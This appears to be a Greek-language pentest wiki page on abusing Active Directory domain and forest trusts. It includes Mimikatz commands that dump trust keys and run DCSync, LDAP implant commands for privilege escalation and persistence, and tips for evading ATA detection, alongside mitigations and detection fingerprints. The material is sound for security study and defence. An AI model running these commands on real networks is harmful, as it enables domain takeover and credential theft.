Η Microsoft θεωρεί το **Forest** ως το όριο ασφαλείας. Αυτό σημαίνει ότι **η παραβίαση ενός domain μπορεί ενδεχομένως να οδηγήσει στην παραβίαση ολόκληρου του Forest**.<sup>[[1]](#references)</sup>

### Βασικές πληροφορίες

Ένα [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) είναι ένας μηχανισμός ασφαλείας που επιτρέπει σε έναν χρήστη από ένα **domain** να αποκτά πρόσβαση σε πόρους ενός άλλου **domain**. Ουσιαστικά, δημιουργεί μια σύνδεση ανάμεσα στα συστήματα ταυτοποίησης των δύο domain, επιτρέποντας την απρόσκοπτη ανταλλαγή επαληθεύσεων ταυτοποίησης. Όταν τα domain δημιουργούν ένα trust, ανταλλάσσουν και διατηρούν συγκεκριμένα **keys** στους **Domain Controllers (DCs)** τους, τα οποία είναι κρίσιμα για την ακεραιότητα του trust.

Σε ένα συνηθισμένο σενάριο, αν ένας χρήστης θέλει να αποκτήσει πρόσβαση σε μια υπηρεσία σε ένα **trusted domain**, πρέπει πρώτα να ζητήσει ένα ειδικό εισιτήριο, γνωστό ως **inter-realm TGT**, από τον DC του δικού του domain. Αυτό το TGT κρυπτογραφείται με ένα κοινόχρηστο **key** στο οποίο έχουν συμφωνήσει και τα δύο domain. Στη συνέχεια, ο χρήστης παρουσιάζει αυτό το TGT στον **DC του trusted domain** για να λάβει ένα service ticket (**TGS**). Αν ο DC του trusted domain επικυρώσει επιτυχώς το inter-realm TGT, εκδίδει ένα TGS, παρέχοντας στον χρήστη πρόσβαση στην υπηρεσία.

**Βήματα**:

1. Ένας **client computer** στο **Domain 1** ξεκινά τη διαδικασία χρησιμοποιώντας το **NTLM hash** του για να ζητήσει ένα **Ticket Granting Ticket (TGT)** από τον **Domain Controller (DC1)** του.
2. Ο DC1 εκδίδει ένα νέο TGT αν η ταυτοποίηση του client είναι επιτυχής.
3. Στη συνέχεια, ο client ζητά ένα **inter-realm TGT** από τον DC1, το οποίο χρειάζεται για την πρόσβαση σε πόρους του **Domain 2**.
4. Το inter-realm TGT κρυπτογραφείται με ένα **trust key** που μοιράζονται οι DC1 και DC2 στο πλαίσιο του αμφίδρομου domain trust.
5. Ο client μεταφέρει το inter-realm TGT στον **Domain Controller (DC2) του Domain 2**.
6. Ο DC2 επαληθεύει το inter-realm TGT χρησιμοποιώντας το κοινόχρηστο trust key και, αν είναι έγκυρο, εκδίδει ένα **Ticket Granting Service (TGS)** για τον server του Domain 2 στον οποίο θέλει να αποκτήσει πρόσβαση ο client.
7. Τέλος, ο client παρουσιάζει αυτό το TGS στον server, το οποίο είναι κρυπτογραφημένο με το hash του λογαριασμού του server, για να αποκτήσει πρόσβαση στην υπηρεσία του Domain 2.

### Διαφορετικά trusts

Είναι σημαντικό να σημειωθεί ότι **ένα trust μπορεί να είναι μονόδρομο ή αμφίδρομο**. Στην αμφίδρομη περίπτωση, τα δύο domain εμπιστεύονται το ένα το άλλο, ενώ σε μια **μονόδρομη** σχέση trust, το ένα domain είναι το **trusted** και το άλλο το **trusting** domain. Στη δεύτερη περίπτωση, **θα μπορείτε να αποκτήσετε πρόσβαση σε πόρους μόνο μέσα στο trusting domain, ξεκινώντας από το trusted domain**.

Αν το Domain A εμπιστεύεται το Domain B, το A είναι το trusting domain και το B το trusted domain. Επιπλέον, στο **Domain A**, αυτό είναι ένα **Outbound trust**, ενώ στο **Domain B** είναι ένα **Inbound trust**.

**Διαφορετικές σχέσεις trust**

- **Parent-Child Trusts**: Πρόκειται για μια συνηθισμένη ρύθμιση μέσα στο ίδιο forest, όπου ένα child domain έχει αυτόματα αμφίδρομο transitive trust με το parent domain του. Ουσιαστικά, αυτό σημαίνει ότι τα αιτήματα ταυτοποίησης μπορούν να περνούν απρόσκοπτα μεταξύ parent και child.
- **Cross-link Trusts**: Γνωστά και ως «shortcut trusts», δημιουργούνται μεταξύ child domain για να επιταχύνουν τις διαδικασίες παραπομπής. Σε σύνθετα forest, οι παραπομπές ταυτοποίησης συνήθως πρέπει να περάσουν από το forest root και έπειτα να κατευθυνθούν προς τα κάτω, στο domain-στόχο. Με τη δημιουργία cross-links, η διαδρομή συντομεύεται, κάτι που είναι ιδιαίτερα χρήσιμο σε γεωγραφικά κατανεμημένα περιβάλλοντα.
- **External Trusts**: Δημιουργούνται μεταξύ διαφορετικών, μη συσχετισμένων domain και είναι εξ ορισμού non-transitive. Σύμφωνα με την [τεκμηρίωση της Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), τα external trusts είναι χρήσιμα για την πρόσβαση σε πόρους ενός domain εκτός του τρέχοντος forest, το οποίο δεν συνδέεται μέσω forest trust. Η ασφάλεια ενισχύεται μέσω SID filtering με τα external trusts.
- **Tree-root Trusts**: Αυτά τα trusts δημιουργούνται αυτόματα μεταξύ του forest root domain και ενός νέου tree root που προστίθεται. Παρότι δεν συναντώνται συχνά, είναι σημαντικά για την προσθήκη νέων domain trees σε ένα forest, επιτρέποντάς τους να διατηρούν ένα μοναδικό όνομα domain και διασφαλίζοντας αμφίδρομη transitivity. Περισσότερες πληροφορίες υπάρχουν στον [οδηγό της Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Αυτός ο τύπος trust είναι ένα αμφίδρομο transitive trust μεταξύ δύο forest root domain και εφαρμόζει επίσης SID filtering για την ενίσχυση της ασφάλειας.
- **MIT Trusts**: Αυτά τα trusts δημιουργούνται με Kerberos domain που δεν χρησιμοποιούν Windows και συμμορφώνονται με το [RFC4120](https://tools.ietf.org/html/rfc4120). Τα MIT trusts είναι πιο εξειδικευμένα και προορίζονται για περιβάλλοντα που απαιτούν ενσωμάτωση με συστήματα βασισμένα στο Kerberos εκτός του οικοσυστήματος Windows.

#### Άλλες διαφορές στις **σχέσεις trust**

- Μια σχέση trust μπορεί επίσης να είναι **transitive** (το A εμπιστεύεται το B, το B εμπιστεύεται το C, άρα το A εμπιστεύεται το C) ή **non-transitive**.
- Μια σχέση trust μπορεί να ρυθμιστεί ως **bidirectional trust** (εμπιστεύονται το ένα το άλλο) ή ως **one-way trust** (μόνο το ένα εμπιστεύεται το άλλο).

### Διαδρομή επίθεσης

1. **Enumerate** τις σχέσεις trust
2. Ελέγξτε αν κάποιο **security principal** (user/group/computer) έχει **πρόσβαση** σε πόρους του **άλλου domain**, ίσως μέσω καταχωρίσεων ACE ή επειδή ανήκει σε ομάδες του άλλου domain. Αναζητήστε **σχέσεις μεταξύ domain** (πιθανότατα γι' αυτό δημιουργήθηκε το trust).
   1. Σε αυτή την περίπτωση, το kerberoast θα μπορούσε να είναι μια άλλη επιλογή.
3. **Παραβιάστε** τους **λογαριασμούς** που μπορούν να χρησιμοποιηθούν για **pivot** μεταξύ domain.

Οι επιτιθέμενοι που έχουν πρόσβαση σε πόρους ενός άλλου domain μπορούν να την αποκτήσουν μέσω τριών βασικών μηχανισμών:

- **Membership σε τοπικές ομάδες**: Principals μπορεί να προστεθούν σε τοπικές ομάδες μηχανημάτων, όπως η ομάδα «Administrators» ενός server, αποκτώντας σημαντικό έλεγχο πάνω σε αυτό το μηχάνημα.
- **Membership σε ομάδες ξένου domain**: Οι principals μπορούν επίσης να είναι μέλη ομάδων μέσα στο ξένο domain. Ωστόσο, η αποτελεσματικότητα αυτής της μεθόδου εξαρτάται από τη φύση του trust και το εύρος της ομάδας.
- **Access Control Lists (ACLs)**: Οι principals μπορεί να καθορίζονται σε μια **ACL**, ιδίως ως οντότητες σε **ACEs** μέσα σε μια **DACL**, παρέχοντάς τους πρόσβαση σε συγκεκριμένους πόρους. Για όσους θέλουν να εμβαθύνουν στους μηχανισμούς των ACLs, DACLs και ACEs, το whitepaper με τίτλο “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” είναι πολύτιμη πηγή.<sup>[[17]](#references)</sup>

### Εντοπισμός εξωτερικών χρηστών/ομάδων με δικαιώματα

Μπορείτε να ελέγξετε το **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** για να εντοπίσετε foreign security principals στο domain. Πρόκειται για user/group από **εξωτερικό domain/forest**.

Μπορείτε να το ελέγξετε στο **Bloodhound** ή χρησιμοποιώντας το powerview:

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Child-to-Parent forest privilege escalation

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

Άλλοι τρόποι απαρίθμησης των σχέσεων εμπιστοσύνης μεταξύ τομέων:

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> Υπάρχουν **2 έμπιστα κλειδιά**, ένα για _Child --> Parent_ και ένα άλλο για _Parent_ --> _Child_.\
> Μπορείτε να βρείτε αυτό που χρησιμοποιείται από τον τρέχοντα τομέα με:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Κάντε privilege escalation σε Enterprise admin στο child/parent domain, κάνοντας κατάχρηση του trust με SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Εκμετάλλευση εγγράψιμου Configuration NC

Είναι σημαντικό να κατανοήσετε πώς μπορεί να γίνει εκμετάλλευση του Configuration Naming Context (NC). Το Configuration NC λειτουργεί ως κεντρικό αποθετήριο δεδομένων διαμόρφωσης σε ένα forest σε περιβάλλοντα Active Directory (AD). Αυτά τα δεδομένα αναπαράγονται σε κάθε Domain Controller (DC) του forest, ενώ οι εγγράψιμοι DC διατηρούν ένα εγγράψιμο αντίγραφο του Configuration NC. Για να γίνει εκμετάλλευσή του, απαιτούνται **SYSTEM privileges σε έναν DC**, κατά προτίμηση σε child DC.

**Σύνδεση GPO με το site του root DC**

Το container Sites του Configuration NC περιέχει πληροφορίες για τα sites όλων των υπολογιστών που είναι συνδεδεμένοι στο domain μέσα στο AD forest. Με SYSTEM privileges σε οποιονδήποτε DC, οι επιτιθέμενοι μπορούν να συνδέσουν GPO με τα sites του root DC. Αυτή η ενέργεια μπορεί να θέσει σε κίνδυνο το root domain, μέσω της τροποποίησης των policies που εφαρμόζονται σε αυτά τα sites.

Για πιο αναλυτικές πληροφορίες, μπορείτε να εξετάσετε την έρευνα σχετικά με την [Παράκαμψη του SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Παραβίαση οποιουδήποτε gMSA στο forest**

Ένας τρόπος επίθεσης είναι η στόχευση προνομιούχων gMSA στο domain. Το KDS Root key, που είναι απαραίτητο για τον υπολογισμό των passwords των gMSA, αποθηκεύεται στο Configuration NC. Με SYSTEM privileges σε οποιονδήποτε DC, είναι δυνατή η πρόσβαση στο KDS Root key και ο υπολογισμός των passwords για οποιοδήποτε gMSA σε όλο το forest.

Λεπτομερής ανάλυση και οδηγίες βήμα προς βήμα θα βρείτε εδώ:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Συμπληρωματική επίθεση delegated MSA (BadSuccessor – κατάχρηση migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Πρόσθετη εξωτερική έρευνα: [Επιθέσεις Golden gMSA Trust](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Επίθεση αλλαγής Schema**

Αυτή η μέθοδος απαιτεί υπομονή, καθώς πρέπει να περιμένετε τη δημιουργία νέων προνομιούχων AD objects. Με SYSTEM privileges, ένας επιτιθέμενος μπορεί να τροποποιήσει το AD Schema ώστε να δώσει σε οποιονδήποτε user πλήρη έλεγχο όλων των classes. Αυτό μπορεί να οδηγήσει σε μη εξουσιοδοτημένη πρόσβαση και έλεγχο των νεοδημιουργημένων AD objects.

Περισσότερες πληροφορίες θα βρείτε στο [Επιθέσεις Trust μέσω αλλαγής Schema](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**Από DA σε EA με ADCS ESC5**

Η ευπάθεια ADCS ESC5 στοχεύει στον έλεγχο των objects του Public Key Infrastructure (PKI), ώστε να δημιουργηθεί ένα certificate template που επιτρέπει authentication ως οποιοσδήποτε user μέσα στο forest. Καθώς τα PKI objects βρίσκονται στο Configuration NC, η παραβίαση ενός εγγράψιμου child DC επιτρέπει την εκτέλεση επιθέσεων ESC5.

Περισσότερες λεπτομέρειες θα βρείτε στο [Από DA σε EA με ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> Σε περιπτώσεις όπου δεν υπάρχει ADCS, ο επιτιθέμενος μπορεί να εγκαταστήσει τα απαραίτητα components, όπως περιγράφεται στο [Privilege escalation από Child Domain Admins σε Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### Εξωτερικό Forest Domain - One-Way (Inbound) ή αμφίδρομο

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

Σε αυτό το σενάριο, **το domain σας είναι έμπιστο** από ένα εξωτερικό domain, το οποίο σας παρέχει **απροσδιόριστα δικαιώματα** σε αυτό. Θα πρέπει να βρείτε **ποιοι principals του domain σας έχουν πρόσβαση στο εξωτερικό domain και τι είδους πρόσβαση έχουν** και, στη συνέχεια, να προσπαθήσετε να το εκμεταλλευτείτε:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Εξωτερικό Forest Domain - Μονόδρομο (Outbound)

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

Σε αυτό το σενάριο, **το domain σου** **εμπιστεύεται** ορισμένα **privileges** σε principal από **διαφορετικά domains**.

Ωστόσο, όταν ένα **domain γίνεται trusted** από το domain που το εμπιστεύεται, το trusted domain **δημιουργεί έναν user** με **προβλέψιμο όνομα**, ο οποίος χρησιμοποιεί ως **password το trusted password**. Αυτό σημαίνει ότι είναι δυνατό να **αποκτήσεις πρόσβαση σε έναν user από το domain που εμπιστεύεται**, ώστε να μπεις στο trusted domain, να το απαριθμήσεις και να προσπαθήσεις να κλιμακώσεις περαιτέρω τα privileges:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Ένας άλλος τρόπος να παραβιάσεις το trusted domain είναι να εντοπίσεις έναν [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) που έχει δημιουργηθεί προς την **αντίθετη κατεύθυνση** από το domain trust (κάτι που δεν είναι πολύ συνηθισμένο).

Ένας άλλος τρόπος να παραβιάσεις το trusted domain είναι να περιμένεις σε ένα μηχάνημα στο οποίο ένας **user από το trusted domain μπορεί να συνδεθεί** μέσω **RDP**. Τότε, ο attacker θα μπορούσε να κάνει code injection στη διεργασία της RDP session και να **αποκτήσει πρόσβαση στο origin domain του θύματος** από εκεί.\
Επιπλέον, αν το **θύμα είχε προσαρτήσει τον σκληρό του δίσκο**, ο attacker θα μπορούσε, μέσω της διεργασίας της **RDP session**, να αποθηκεύσει **backdoors** στον **startup folder του σκληρού δίσκου**. Αυτή η τεχνική ονομάζεται **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Μετριασμός του domain trust abuse

### **SID Filtering:**

- Ο κίνδυνος επιθέσεων που αξιοποιούν το SID history attribute μέσω forest trusts μετριάζεται από το SID Filtering, το οποίο είναι ενεργοποιημένο από προεπιλογή σε όλα τα inter-forest trusts. Αυτό βασίζεται στην παραδοχή ότι τα intra-forest trusts είναι ασφαλή, καθώς η Microsoft θεωρεί το forest, και όχι το domain, ως όριο ασφαλείας.
- Υπάρχει, ωστόσο, μια επιφύλαξη: το SID filtering ενδέχεται να διαταράξει τη λειτουργία εφαρμογών και την πρόσβαση των χρηστών, με αποτέλεσμα να απενεργοποιείται περιστασιακά.

### **Selective Authentication:**

- Στα inter-forest trusts, η χρήση του Selective Authentication διασφαλίζει ότι οι users των δύο forests δεν πραγματοποιούν αυτόματα authentication. Αντίθετα, απαιτούνται ρητά permissions ώστε οι users να έχουν πρόσβαση σε domains και servers μέσα στο domain ή το forest που τους εμπιστεύεται.
- Είναι σημαντικό να σημειωθεί ότι αυτά τα μέτρα δεν προστατεύουν από την εκμετάλλευση του writable Configuration Naming Context (NC) ή από επιθέσεις στον trust account.

[**Περισσότερες πληροφορίες για τα domain trusts στο ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## AD Abuse μέσω LDAP από On-Host Implants

Το [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) επανυλοποιεί primitives LDAP τύπου bloodyAD ως x64 Beacon Object Files που εκτελούνται εξ ολοκλήρου μέσα σε implant στο host (π.χ. Adaptix C2). Οι operators μεταγλωττίζουν το πακέτο με `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, φορτώνουν το `ldap.axs` και έπειτα καλούν `ldap <subcommand>` από το beacon. Όλη η κίνηση χρησιμοποιεί το τρέχον logon security context μέσω LDAP (389) με signing/sealing ή LDAPS (636) με αυτόματη εμπιστοσύνη πιστοποιητικών, επομένως δεν απαιτούνται socks proxies ή artifacts στον δίσκο.<sup>[[4]](#references)</sup>

### Απαρίθμηση LDAP από την πλευρά του implant

- Τα `get-users`, `get-computers`, `get-groups`, `get-usergroups` και `get-groupmembers` επιλύουν σύντομα ονόματα/διαδρομές OU σε πλήρη DNs και εξάγουν τα αντίστοιχα objects.
- Τα `get-object`, `get-attribute` και `get-domaininfo` ανακτούν αυθαίρετα attributes (συμπεριλαμβανομένων των security descriptors), καθώς και τα metadata του forest/domain από το `rootDSE`.
- Τα `get-uac`, `get-spn`, `get-delegation` και `get-rbcd` αποκαλύπτουν υποψήφιους στόχους για roasting, ρυθμίσεις delegation και υπάρχοντα descriptors [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) απευθείας από το LDAP.
- Τα `get-acl` και `get-writable --detailed` αναλύουν το DACL και καταγράφουν trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes) και inheritance, παρέχοντας άμεσα στόχους για privilege escalation μέσω ACL.

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### LDAP primitive-uri εγγραφής για κλιμάκωση προνομίων και persistence

- Τα BOF δημιουργίας αντικειμένων (`add-user`, `add-computer`, `add-group`, `add-ou`) επιτρέπουν στον operator να προετοιμάσει νέα principals ή λογαριασμούς υπολογιστών όπου υπάρχουν δικαιώματα OU. Τα `add-groupmember`, `set-password`, `add-attribute` και `set-attribute` επιτρέπουν την άμεση κατάληψη στόχων μόλις εντοπιστούν δικαιώματα write-property.
- Εντολές εστιασμένες σε ACL, όπως οι `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` και `add-dcsync`, μετατρέπουν τα WriteDACL/WriteOwner σε οποιοδήποτε αντικείμενο AD σε επαναφορές κωδικών πρόσβασης, έλεγχο συμμετοχής σε ομάδες ή προνόμια αναπαραγωγής DCSync, χωρίς να αφήνουν ίχνη PowerShell/ADSI. Τα αντίστοιχα `remove-*` καθαρίζουν τα ACE που προστέθηκαν.

### Delegation, roasting και κατάχρηση Kerberos

- Τα `add-spn`/`set-spn` καθιστούν αμέσως έναν παραβιασμένο χρήστη ευάλωτο σε Kerberoast· το `add-asreproastable` (εναλλαγή UAC) τον επισημαίνει για AS-REP roasting χωρίς να αγγίξει τον κωδικό πρόσβασης.
- Τα delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) τροποποιούν τα `msDS-AllowedToDelegateTo`, τις σημαίες UAC ή το `msDS-AllowedToActOnBehalfOfOtherIdentity` από το beacon, ενεργοποιώντας attack paths constrained/unconstrained/RBCD και καταργώντας την ανάγκη για remote PowerShell ή RSAT.

### Εισαγωγή sidHistory, μετακίνηση OU και διαμόρφωση επιφάνειας επίθεσης

- Το `add-sidhistory` εισάγει προνομιούχα SID στο SID history ενός ελεγχόμενου principal (βλ. [SID-History Injection](sid-history-injection.md)), παρέχοντας stealthy κληρονόμηση πρόσβασης εξ ολοκλήρου μέσω LDAP/LDAPS.
- Το `move-object` αλλάζει το DN/OU υπολογιστών ή χρηστών, επιτρέποντας στον attacker να μεταφέρει assets υπό delegated rights πριν χρησιμοποιήσει τα `set-password`, `add-groupmember` ή `add-spn`. Βλ. [μετακίνηση OU και κληρονομημένα δικαιώματα](acl-persistence-abuse/#moving-an-object-into-inherited-ou-permissions) για τα δικαιώματα μετακίνησης και τους ελέγχους κληρονομικότητας.
- Οι εντολές αφαίρεσης με αυστηρά περιορισμένο πεδίο (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` κ.λπ.) επιτρέπουν γρήγορη αναίρεση μετά τη συλλογή διαπιστευτηρίων ή την εγκατάσταση persistence από τον operator, ελαχιστοποιώντας την τηλεμετρία.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Μερικές γενικές άμυνες

[**Μάθετε περισσότερα εδώ για την προστασία των διαπιστευτηρίων.**](../stealing-credentials/credentials-protections.md)

### **Αμυντικά μέτρα για την προστασία διαπιστευτηρίων**

- **Περιορισμοί Domain Admins**: Συνιστάται οι Domain Admins να επιτρέπεται να συνδέονται μόνο σε Domain Controllers, αποφεύγοντας τη χρήση τους σε άλλους hosts.
- **Προνόμια λογαριασμών υπηρεσιών**: Οι υπηρεσίες δεν πρέπει να εκτελούνται με προνόμια Domain Admin (DA), ώστε να διατηρείται η ασφάλεια.
- **Χρονικός περιορισμός προνομίων**: Για εργασίες που απαιτούν προνόμια DA, η διάρκειά τους πρέπει να περιορίζεται. Αυτό μπορεί να επιτευχθεί με: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Μετριασμός LDAP relay**: Ελέγξτε τα Event ID 2889/3074/3075 και, στη συνέχεια, επιβάλετε LDAP signing και LDAPS channel binding στους DCs/clients, ώστε να αποκλείσετε απόπειρες LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Fingerprinting δραστηριότητας Impacket σε επίπεδο πρωτοκόλλου

Αν θέλετε να εντοπίζετε συνήθεις τεχνικές AD, **μη βασίζεστε μόνο σε τεχνουργήματα που ελέγχει ο operator**, όπως μετονομασμένα binaries, ονόματα υπηρεσιών, προσωρινά αρχεία batch ή διαδρομές εξόδου. Καταγράψτε ως baseline τον τρόπο με τον οποίο οι νόμιμοι Windows clients δημιουργούν κίνηση [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC και WMI και, στη συνέχεια, αναζητήστε **ιδιαιτερότητες υλοποίησης** που παραμένουν ακόμη κι όταν ο operator τροποποιήσει τα `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` ή `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Ισχυρές μεμονωμένες ενδείξεις** (αφού πρώτα επαληθευτούν σε σχέση με το δικό σας baseline):
  - Πιστοποιημένο DCE/RPC με χρήση `auth_context_id = 79231 + ctx_id`
  - Padding ελέγχου ταυτότητας DCE/RPC συμπληρωμένο με `0xff`
  - LDAP Kerberos binds που τοποθετούν ένα ακατέργαστο Kerberos `AP-REQ` απευθείας στο SPNEGO `mechToken`
  - Αιτήματα διαπραγμάτευσης SMB2/3 με τιμές `ClientGuid` που μοιάζουν με ASCII
  - WMI `IWbemLevel1Login::NTLMLogin` με χρήση του μη τυπικού namespace `//./root/cimv2`
  - Σκληρά κωδικοποιημένες τιμές nonce Kerberos
- **Καταλληλότερα ως χαρακτηριστικά συσχέτισης/βαθμολόγησης**:
  - Αραιές ή διπλότυπες λίστες Kerberos etype, ασυνήθιστα/απόντα `PA-DATA` ή σειρά etype σε TGS-REQ που διαφέρει από τα εγγενή Windows
  - Μηνύματα NTLM Type 1 χωρίς πληροφορίες έκδοσης ή μηνύματα Type 3 με κενά ονόματα host
  - Ακατέργαστο NTLMSSP μέσω DCE/RPC αντί για SPNEGO, απουσία verification trailers DCE/RPC ή ασυμφωνίες SPNEGO/Kerberos OID
  - Πολλά από αυτά τα χαρακτηριστικά από τον ίδιο host/user/session/χρονικό παράθυρο αποτελούν πολύ ισχυρότερη ένδειξη από οποιοδήποτε μεμονωμένο, ασθενές πεδίο
- **Χρησιμοποιήστε τα ως πρόσθετες πληροφορίες, όχι ως αυτόνομες ειδοποιήσεις**:
  - Προεπιλεγμένα ονόματα αρχείων, διαδρομές εξόδου, τυχαία ονόματα υπηρεσιών, προσωρινά ονόματα batch, προεπιλεγμένα ονόματα λογαριασμών υπολογιστών και συμβολοσειρές HTTP/WebDAV/RDP/MSSQL ειδικές για εργαλεία
  - Οι operators μπορούν εύκολα να τα αλλάξουν και είναι προτιμότερο να χρησιμοποιούνται για να εξηγούν γιατί ένα cluster πολλών πρωτοκόλλων φαίνεται ύποπτο
- **Επιχειρησιακές σημειώσεις**:
  - Ορισμένα από αυτά τα σήματα απαιτούν αποκρυπτογραφημένη κίνηση, [ανάλυση PCAP/Zeek](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW ή ορατότητα από την πλευρά της υπηρεσίας
  - Επαληθεύστε τα σε σχέση με Samba/Linux clients, συσκευές και παλαιότερο λογισμικό πριν τα μετατρέψετε σε ειδοποιήσεις
  - Αναβαθμίστε τις ανιχνεύσεις από enrichment -> hunting -> alerting καθώς αυξάνεται η βεβαιότητά σας για το baseline

### **Εφαρμογή τεχνικών εξαπάτησης**

- Η εφαρμογή deception περιλαμβάνει τη δημιουργία παγίδων, όπως decoy χρήστες ή υπολογιστές με χαρακτηριστικά όπως κωδικούς πρόσβασης που δεν λήγουν ή την ένδειξη Trusted for Delegation. Μια λεπτομερής προσέγγιση περιλαμβάνει τη δημιουργία χρηστών με συγκεκριμένα δικαιώματα ή την προσθήκη τους σε ομάδες με υψηλά προνόμια.<sup>[[2]](#references)</sup>
- Ένα πρακτικό παράδειγμα είναι η χρήση εργαλείων όπως: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Περισσότερες πληροφορίες για την ανάπτυξη τεχνικών deception υπάρχουν στο [Deploy-Deception στο GitHub](https://github.com/samratashok/Deploy-Deception).

### **Εντοπισμός deception**

- **Για αντικείμενα χρηστών**: Ύποπτες ενδείξεις περιλαμβάνουν ασυνήθιστα ObjectSID, σπάνιες συνδέσεις, ημερομηνίες δημιουργίας και χαμηλό αριθμό αποτυχημένων προσπαθειών κωδικού πρόσβασης.
- **Γενικές ενδείξεις**: Η σύγκριση των χαρακτηριστικών πιθανών decoy αντικειμένων με εκείνα γνήσιων αντικειμένων μπορεί να αποκαλύψει ασυνέπειες. Εργαλεία όπως το [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) μπορούν να βοηθήσουν στον εντοπισμό τέτοιων περιπτώσεων deception.

### **Παράκαμψη συστημάτων ανίχνευσης**

- **Παράκαμψη ανίχνευσης Microsoft ATA**:
  - **Απαρίθμηση χρηστών**: Αποφύγετε την απαρίθμηση sessions σε Domain Controllers για να αποτρέψετε την ανίχνευση από το ATA.
  - **Impersonation εισιτηρίων**: Η χρήση κλειδιών **aes** για τη δημιουργία εισιτηρίων βοηθά στην αποφυγή ανίχνευσης, καθώς δεν γίνεται υποβάθμιση σε NTLM.
  - **Επιθέσεις DCSync**: Συνιστάται η εκτέλεσή τους από υπολογιστή που δεν είναι Domain Controller για την αποφυγή ανίχνευσης από το ATA, καθώς η απευθείας εκτέλεση από Domain Controller θα προκαλέσει ειδοποιήσεις.

## References

- [1] [Οδηγός επίθεσης σε σχέσεις εμπιστοσύνης τομέων](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Πλαστογράφηση σχέσεων εμπιστοσύνης για deception στο Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Από Domain Admin σε Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
